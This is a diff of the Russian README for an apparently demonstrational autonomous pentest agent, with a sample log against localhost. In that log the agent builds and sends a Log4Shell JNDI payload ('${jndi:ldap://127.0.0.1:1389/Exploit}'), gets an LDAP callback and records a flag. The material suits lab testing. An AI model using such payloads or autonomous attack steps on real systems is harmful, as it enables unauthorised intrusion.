@@ -1,7 +1,10 @@
 # 🤖 AEON ARSENAL: Autonomous Reactive Pentest Agent
+
+*Read this in other languages: [English](README.en.md), [Русский](README.md).*
+
 > **Изолированный демонстрационный стенд автономного рефлексивного агента-исполнителя (Go/Java)**
 
-[![Go Version](https://img.shields.io/badge/Go-1.25.0+-00ADD8?style=for-the-badge&logo=go)](https://golang.org)
+[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=for-the-badge&logo=go)](https://golang.org)
 [![Java Version](https://img.shields.io/badge/Java-17+-ED8B00?style=for-the-badge&logo=openjdk)](https://openjdk.org)
 [![Maven](https://img.shields.io/badge/Maven-3.8+-C71A36?style=for-the-badge&logo=apachemaven)](https://maven.apache.org)
 [![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
@@ -156,10 +159,10 @@ go build -o test_agent ./cmd/agent
 
 [ВЫВОД] Выбран инструмент: 'payload_generator' (Текущая фаза: Discovery)
 [ЭФФЕКТОР:payload_generator] Анализ уязвимостей и синтез сигнатур...
-[НАБЛЮДЕНИЕ] OBSERVATION: Сгенерирована сигнатурная нагрузка для CVE-2021-44228: '${jndi:ldap://127.0.0.1:1389/a}'.
+[НАБЛЮДЕНИЕ] OBSERVATION: Сгенерирована сигнатурная нагрузка для CVE-2021-44228: '${jndi:ldap://127.0.0.1:1389/Exploit}'.
 
 [ВЫВОД] Выбран инструмент: 'prober' (Текущая фаза: Discovery)
-[ЭФФЕКТОР:prober] Первичная атака: Отправка нагрузки '${jndi:ldap://127.0.0.1:1389/a}' на http://localhost:8080...
+[ЭФФЕКТОР:prober] Первичная атака: Отправка нагрузки '${jndi:ldap://127.0.0.1:1389/Exploit}' на http://localhost:8080...
 
 [СЛУШАТЕЛЬ] >>> ПОЛУЧЕН ВХОДЯЩИЙ TCP-КОЛЛБЕК НА ПОРТ 1389 (Log4Shell подтвержден!) <<<
 [НАБЛЮДЕНИЕ] SUCCESS: LDAP Callback получен на порту 1389 (Loot: FLAG{LOG4SHELL_EXPLOITED_SUCCESSFULLY}).
@@ -175,7 +178,7 @@ go build -o test_agent ./cmd/agent
 
 [ВЫВОД] Выбран инструмент: 'reporter' (Текущая фаза: Verification)
 [ЭФФЕКТОР:reporter] Формирование отчета об уязвимости по стандартам РФ для http://localhost:8080...
-[НАБЛЮДЕНИЕ] REPORT_SUCCESS: Отчет успешно сгенерирован и сохранен в файл 'cve_2021_44228_report.md'.
+[НАБЛЮДЕНИЕ] REPORT_SUCCESS: Отчет успешно сгенерирован и сохранен в файл 'reports/cve_2021_44228_report.md'.
 
 ================================================================
 [INFO] Жизненный цикл аудита, патчинга и комплаенса завершен.
@@ -184,7 +187,7 @@ go build -o test_agent ./cmd/agent
 ---
 
 ## 📜 Защита информации и комплаенс
-Генерируемый агентом отчет в файле `cve_2021_44228_report.md` учитывает ключевые российские стандарты ИБ:
+Генерируемый агентом отчет в файле `reports/cve_2021_44228_report.md` учитывает ключевые российские стандарты ИБ:
 * **ГОСТ Р 56939-2016** — Разработка безопасного программного обеспечения.
 * **ФЗ-152** — Требования по защите персональных данных (ПДн) при обнаружении недекларированных возможностей.
 * **ФЗ-187** — Обеспечение устойчивости объектов критической информационной инфраструктуры (КИИ РФ).
